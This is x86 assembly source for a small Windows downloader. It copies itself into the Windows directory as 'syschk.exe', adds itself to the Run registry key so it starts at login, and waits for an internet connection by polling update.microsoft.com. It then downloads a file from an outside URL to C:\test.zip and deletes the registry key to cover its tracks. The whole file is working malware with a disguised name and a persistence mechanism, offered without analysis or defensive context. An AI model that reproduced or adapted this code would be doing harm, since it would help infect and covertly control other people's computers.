.586p
.model flat,stdcall

extrn GetModuleFileNameA     :PROC
extrn GetWindowsDirectoryA   :PROC
extrn lstrcat                :PROC
extrn lstrcmp                :PROC
extrn lstrlen                :PROC
extrn CopyFileA              :PROC
extrn RegOpenKeyExA          :PROC
extrn RegSetValueExA         :PROC
extrn RegDeleteValueA        :PROC
extrn RegCloseKey            :PROC
extrn Sleep                  :PROC
extrn ExitProcess            :PROC
extrn ShellExecuteA          :PROC
extrn CreateMutexA           :PROC
extrn GetLastError           :PROC
extrn GetProcAddress         :PROC
extrn LoadLibraryA           :PROC
extrn InternetCheckConnectionA:PROC

FLAG_ICC_FORCE_CONNECTION     equ     00000001h

.data

szBuff    db 260 dup(0)
szWinDir  db 260 dup(0)

szNewName  db '\syschk.exe',0
szRegkey   db 'Software\Microsoft\Windows\CurrentVersion\Run',0
szRegval   db 'syschk',0
szConChek  db 'http://update.microsoft.com/',0
szSite     db 'http://www.pscode.com/vb/scripts/ShowZip.asp?lngWId=10&lngCodeId=4935&strZipAccessCode=tp%2FC49357473',0
szSavePath db 'C:\test.zip',0
szOpen     db 'open',0
szMtx      db 'ad0wn',0
szWininet  db 'WININET.DLL',0
szUrlmon   db 'URLMON.DLL',0
szICheck   db 'InternetCheckConnectionA',0
szDownload db 'URLDownloadToFileA',0

sleeptime  dw 10000d

RegHandle  dd ?

WiniHan    dd 0
Urlmon     dd 0
DownHan    dd 0
IOpenHan   dd 0

.code

main:

   push offset szMtx
   push 0h
   push 0h
  call CreateMutexA
  
  call GetLastError
  
   cmp eax,183d
   je Kraj
   
   push 260d
   push offset szBuff
   push 0h
  call GetModuleFileNameA

   push 100h
   push offset szWinDir
  call GetWindowsDirectoryA

   push offset szNewName
   push offset szWinDir
  call lstrcat

   push offset szBuff
   push offset szWinDir
  call lstrcmp

   test eax,eax
   jz Load

   push 0h
   push offset szWinDir
   push offset szBuff
  call CopyFileA

   push offset RegHandle    
   push 00020006h            
   push 0h
   push offset szRegkey
   push 80000001h
  call RegOpenKeyExA

   push offset szWinDir
  call lstrlen

   push eax    
   push offset szWinDir      
   push 00000001h
   push 0h
   push offset szRegval
   push RegHandle
  call RegSetValueExA

   push RegHandle      
  call RegCloseKey

   push 0h
   push 0h
   push 0h
   push offset szWinDir
   push offset szOpen
   push 0h
  call ShellExecuteA
  
   push 0h
  call ExitProcess

  Load:

   push offset szWininet
  call LoadLibraryA

   mov dword ptr [WiniHan],eax
   
   push offset szICheck
   push dword ptr [WiniHan]
  call GetProcAddress

   mov dword ptr [IOpenHan],eax

  Krug:
 
    ;push offset sleeptime
   ;call Sleep
   
    push 0h
    push FLAG_ICC_FORCE_CONNECTION
    push offset szConChek
   call dword ptr [IOpenHan]

    test eax,eax 
    jz Krug

    push offset szUrlmon
   call LoadLibraryA

   mov dword ptr [Urlmon],eax
   
   push  offset szDownload
   push dword ptr [Urlmon]
  call GetProcAddress

   mov dword ptr [DownHan],eax

   push 0h
   push 0h
   push offset szSavePath
   push offset szSite
   push 0h
  call dword ptr [DownHan]

   push offset RegHandle    
   push 00020006h            
   push 0h
   push offset szRegkey
   push 80000001h
  call RegOpenKeyExA

   push offset szRegval
   push RegHandle
  call RegDeleteValueA
        
   push RegHandle
  call RegCloseKey

  Kraj:
    push 0
   call ExitProcess

end main

;Greetz :izee